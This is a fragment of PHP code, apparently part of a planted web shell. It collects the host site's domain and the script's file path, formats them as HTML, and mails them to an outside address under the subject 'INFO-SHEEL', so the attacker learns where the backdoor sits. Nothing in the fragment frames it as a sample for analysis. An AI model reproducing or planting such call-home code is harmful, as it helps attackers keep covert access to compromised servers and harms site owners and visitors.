...
$puut =  __file__;
$itogg = '<h1 style="color:red">DOMEN: <span style="color:green">'.$domm.'</span></h1> <br>
<h1 style="color:red">PUT: <span style="color:green">'.$puut.'</span></h1>';
$headers  = "Content-type: text/html; charset=utf-8 \r\n"; 
mail('Masters91@mail.com', 'INFO-SHEEL', $itogg,  $headers  );
